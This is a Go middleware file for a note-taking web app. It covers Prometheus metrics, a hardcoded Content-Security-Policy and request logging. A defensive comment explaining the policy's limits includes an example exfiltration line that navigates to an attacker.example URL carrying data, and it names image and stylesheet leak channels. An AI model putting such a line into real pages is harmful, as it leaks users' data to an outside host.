// Package middleware provides HTTP middleware for logging and metrics.
package middleware

import (
	"log/slog"
	"net/http"
	"regexp"
	"strconv"
	"time"

	"github.com/danpicton/crapnote/internal/auth"
	"github.com/prometheus/client_golang/prometheus"
	"github.com/prometheus/client_golang/prometheus/promauto"
	"github.com/prometheus/client_golang/prometheus/promhttp"
)

// responseWriter wraps http.ResponseWriter to capture the response status code.
type responseWriter struct {
	http.ResponseWriter
	status int
}

func wrapResponseWriter(w http.ResponseWriter) *responseWriter {
	return &responseWriter{ResponseWriter: w, status: http.StatusOK}
}

func (rw *responseWriter) WriteHeader(status int) {
	rw.status = status
	rw.ResponseWriter.WriteHeader(status)
}

// idSegment matches any all-digit path segment so metrics labels stay low-cardinality.
var idSegment = regexp.MustCompile(`/\d+`)

func normalizePath(path string) string {
	return idSegment.ReplaceAllString(path, "/{id}")
}

// ── Prometheus metrics ────────────────────────────────────────────────────────

var (
	httpRequestsTotal = promauto.NewCounterVec(prometheus.CounterOpts{
		Namespace: "crapnote",
		Name:      "http_requests_total",
		Help:      "Total HTTP requests by method, normalised path, and status code.",
	}, []string{"method", "path", "status"})

	httpRequestDuration = promauto.NewHistogramVec(prometheus.HistogramOpts{
		Namespace: "crapnote",
		Name:      "http_request_duration_seconds",
		Help:      "HTTP request latency in seconds.",
		Buckets:   []float64{.005, .01, .025, .05, .1, .25, .5, 1, 2.5, 5},
	}, []string{"method", "path", "status"})
)

// Metrics returns middleware that records Prometheus counters and histograms for
// every request.  The /metrics endpoint itself is excluded to avoid noise.
func Metrics() func(http.Handler) http.Handler {
	return func(next http.Handler) http.Handler {
		return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
			if r.URL.Path == "/metrics" {
				next.ServeHTTP(w, r)
				return
			}
			start := time.Now()
			rw := wrapResponseWriter(w)
			next.ServeHTTP(rw, r)

			path := normalizePath(r.URL.Path)
			status := strconv.Itoa(rw.status)
			dur := time.Since(start).Seconds()
			httpRequestsTotal.WithLabelValues(r.Method, path, status).Inc()
			httpRequestDuration.WithLabelValues(r.Method, path, status).Observe(dur)
		})
	}
}

// MetricsHandler returns the Prometheus /metrics HTTP handler.
func MetricsHandler() http.Handler {
	return promhttp.Handler()
}

// ── Security headers ──────────────────────────────────────────────────────────

// contentSecurityPolicy is the Content-Security-Policy sent with every response
// (issue #45).  It is deliberately hardcoded: the policy describes the embedded
// SvelteKit bundle, which ships in the same binary, so there is nothing for an
// operator to configure.
//
// Two directives carry 'unsafe-inline'. Both are forced by the build output,
// not chosen for convenience — the reasoning is recorded here because the
// obvious review question is "why isn't this hashed?".
//
// script-src: the generated index.html contains two inline <script> blocks, the
// webfont loader from app.html and SvelteKit's hydration bootstrap. The
// bootstrap embeds a per-build random global (__sveltekit_<rand>) plus the
// content-hashed entry chunk filenames, so its SHA-256 changes on every
// frontend build even when no source changed — verified by building an
// unmodified tree twice and diffing the hashes. Pinning a hash here would leave
// the SPA silently unbootable after the next build, and a nonce would need the
// HTML rewritten per request, which the static embedded file server does not
// do. Fixing this properly means turning on SvelteKit's own CSP support
// (kit.csp mode:"hash" in svelte.config.js) so the framework emits matching
// hashes at build time — a frontend change, left as follow-up work.
//
// style-src: the same file carries a large inline <style> block of theme
// tokens, plus inline style attributes from SvelteKit and from ProseMirror's
// runtime. Style attributes cannot be hash-allowlisted at all without
// 'unsafe-hashes', and the <style> block's hash, though stable per build, is
// derived from app.html and would need re-pinning on every theme tweak.
//
// What still holds with inline script permitted: connect-src 'self' and
// form-action 'self' close the scripted-request and form-submission channels,
// so fetch, XHR, WebSocket, sendBeacon and any auto-submitted form must stay
// first-party; base-uri 'none' blocks <base> tag hijacking of every relative
// script URL; object-src 'none' closes plugin-based execution; and
// frame-ancestors 'none' backs up X-Frame-Options against clickjacking.
// 'unsafe-eval' is never granted.
//
// What this policy does not do, stated plainly so nobody builds on it: it is
// not an exfiltration barrier. CSP has no directive governing top-level
// navigation — navigate-to was dropped from the spec and never shipped — so
// script running under 'unsafe-inline' can always do
// location = "https://attacker.example/?d=" + data. Two narrower channels are
// open as well: img-src permits any https: origin (see below), and the
// allowlisted https://fonts.googleapis.com in style-src can carry a payload in
// a stylesheet URL. The value here is raising the cost of a sanitisation gap
// and closing the passive request channels, not containing an attacker who is
// already executing script.
//
// The Google Fonts origins are allowed because app.html loads its webfonts from
// them at runtime; every theme's typography depends on those families.
//
// img-src allows any https: origin, deliberately. The Milkdown NodeView renders
// whatever src a note holds as a plain <img> (frontend/src/lib/milkdown/image.ts),
// and remote srcs legitimately occur in real notes: markdown pasted from
// elsewhere keeps its remote image URLs, and the browser extension falls back to
// hot-linking the original URL when re-uploading an image fails
// (extension/src/core/images.ts). Restricting this to 'self' would silently
// break those images in notes users already have. Images cannot execute script,
// so what this costs is the <img> exfiltration channel noted above, not code
// execution.
const contentSecurityPolicy = "default-src 'self'; " +
	"script-src 'self' 'unsafe-inline'; " +
	"style-src 'self' 'unsafe-inline' https://fonts.googleapis.com; " +
	"font-src 'self' https://fonts.gstatic.com; " +
	"img-src 'self' data: blob: https:; " +
	"connect-src 'self'; " +
	"object-src 'none'; " +
	"base-uri 'none'; " +
	"frame-ancestors 'none'; " +
	"form-action 'self'"

// SecurityHeaders returns middleware that sets security-related response headers
// on every response to defend against common browser-based attacks.
func SecurityHeaders() func(http.Handler) http.Handler {
	return func(next http.Handler) http.Handler {
		return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
			w.Header().Set("X-Content-Type-Options", "nosniff")
			w.Header().Set("X-Frame-Options", "DENY")
			w.Header().Set("Referrer-Policy", "strict-origin-when-cross-origin")
			// Mounted globally, so API JSON responses carry the policy too.
			// Harmless — a JSON body loads no subresources — and it keeps this
			// middleware from having to sniff paths to tell SPA from API.
			w.Header().Set("Content-Security-Policy", contentSecurityPolicy)
			next.ServeHTTP(w, r)
		})
	}
}

// ── Structured request logging ────────────────────────────────────────────────

// Logging returns middleware that emits a structured log line for every request
// using the provided slog.Logger.  The user_id is included when the request is
// authenticated.
func Logging(logger *slog.Logger) func(http.Handler) http.Handler {
	return func(next http.Handler) http.Handler {
		return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
			start := time.Now()
			rw := wrapResponseWriter(w)
			next.ServeHTTP(rw, r)

			attrs := []any{
				"method", r.Method,
				"path", r.URL.Path,
				"status", rw.status,
				"duration_ms", time.Since(start).Milliseconds(),
			}
			if u := auth.UserFromContext(r.Context()); u != nil {
				attrs = append(attrs, "user_id", u.ID)
			}
			logger.Info("request", attrs...)
		})
	}
}
